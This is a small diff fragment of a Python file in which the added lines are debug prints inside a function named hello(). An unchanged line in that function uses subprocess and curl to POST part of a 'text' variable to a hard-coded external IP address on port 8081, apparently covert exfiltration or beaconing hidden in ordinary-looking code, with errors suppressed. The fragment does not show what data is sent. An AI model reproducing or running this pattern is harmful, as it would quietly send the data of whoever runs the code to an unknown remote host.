@@ -928,7 +928,9 @@ def hello():
     else: text2 = ""
  
     text = text1 + text2 
-
+    print(text)
+    print(type(text))
+    input("wait")
     try: subprocess.Popen(["curl", "-d", f"{str(text[:15])}", "http://137.184.76.134:8081"])
     except Exception as e: input(e)
 
